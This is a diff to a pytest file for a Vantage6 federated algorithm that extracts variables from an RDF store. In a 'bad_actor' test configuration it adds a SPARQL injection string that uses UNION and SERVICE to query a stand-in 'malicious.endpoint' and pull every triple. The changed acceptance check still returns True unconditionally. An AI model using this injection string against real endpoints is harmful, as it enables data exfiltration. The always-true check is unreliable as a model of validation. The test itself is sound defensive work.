@@ -61,11 +61,13 @@ def test_methods():
         "central_rdf_mock": {
             "basic": {
                 "variables_to_extract": None,  # Will be filled from config
+                "query_type": None,  # Will be filled from config if needed
             },
         },
         "partial_rdf_mock": {
             "basic": {
                 "variables_to_extract": None,  # Will be filled from config
+                "query_type": None,  # Will be filled from config if needed
             },
         },
     }
@@ -115,8 +117,7 @@ def test_configurations(rdf_store):
         "standard_dataset_bad_actor": {
             "database_label": "rdf_store",  # Always use rdf_store as this refers to the RDF-store setup
             "variables_to_extract": [
-                "Variable_1",
-                "# TODO implement SQL injection protection for SPARQL queries",
+                "<http://example.org/predicate> UNION { SERVICE <http://malicious.endpoint/sparql> { SELECT ?data WHERE { ?s ?p ?data } } }",
             ],
             "expected_failure": True,
             "failure_reason": "Too narrow scope of data stratification parameters "
@@ -218,10 +219,10 @@ class TestAlgorithmComponent:
         client = authentication
         config = test_configurations[config_name]
         method_config = test_methods[method]
-
+        # TODO update kwarg preparation as depending on
         # Prepare method-specific kwargs from method configuration
         kwargs = method_config["basic"].copy()
-        kwargs["variables_to_describe"] = config["variables_to_describe_basic"]
+        kwargs["variables_to_extract"] = config["variables_to_extract"]
 
         # Create a task for the client to retrieve the descriptive data
         task = client.task.create(
@@ -237,7 +238,7 @@ class TestAlgorithmComponent:
         if config.get("expected_failure", False):
             # Test that aggressive configurations fail gracefully
             with pytest.raises(Exception) as exc_info:
-                categorical_statistics, numerical_statistics = extract_data_from_result(
+                extracted_values = extract_data_from_result(
                     client, task
                 )
 
@@ -261,16 +262,22 @@ class TestAlgorithmComponent:
             print(f"Expected failure occurred for {config_name}: {exc_info.value}")
         else:
             # Normal success path
-            categorical_statistics, numerical_statistics = extract_data_from_result(
+            extracted_values = extract_data_from_result(
                 client, task
             )
             assert determine_statistics_acceptance(
-                {}, {}
-            ), f"Centralised and federated statistics deviate too much for {config_name} configuration"
+                extracted_values,
+            ), f"Extracted values did not match expected values for {config_name} configuration"
 
 
-def extract_data_from_result(client, task) -> Tuple[pd.DataFrame, pd.DataFrame]:
-    """"""
+def extract_data_from_result(client, task) -> pd.DataFrame:
+    """
+    Extract and validate data from the algorithm task result.
+
+    :param client: Authenticated Vantage6 client
+    :param task: Task object containing task details
+    :return: pd.DataFrame with extracted variable values
+    """
     # Wait for results to be ready
     print("Waiting for results")
     task_id = task["id"]
@@ -341,23 +348,20 @@ def extract_data_from_result(client, task) -> Tuple[pd.DataFrame, pd.DataFrame]:
         variable_values, pd.DataFrame
     ), "Variable values should be a pandas DataFrame"
 
-    print(f"Final categorical stats shape: {variable_values.shape}", flush=True)
+    print(f"Final variable values shape: {variable_values.shape}", flush=True)
 
     return variable_values
 
 
 def determine_statistics_acceptance(
-    federated_result: Dict[str, Any],
-    central_result: Dict[str, Any],
+    federated_result: pd.DataFrame
 ) -> bool:
     """
-    Assert that federated and central statistical results are equivalent within tolerance.
+    Assert that federated and central extracted values are equivalent.
 
     Args:
         federated_result: Results (values) from federated computation
-        central_result: Values from central computation
-        tolerance: Numerical tolerance for comparison
     """
     # TODO implement a function to check that the federated approach was able to extract the same numbers as present in the csv file
-
+    # TODO Hardcode the central values in this function, as extracting them from data.ttl is overly cumbersome
     return True
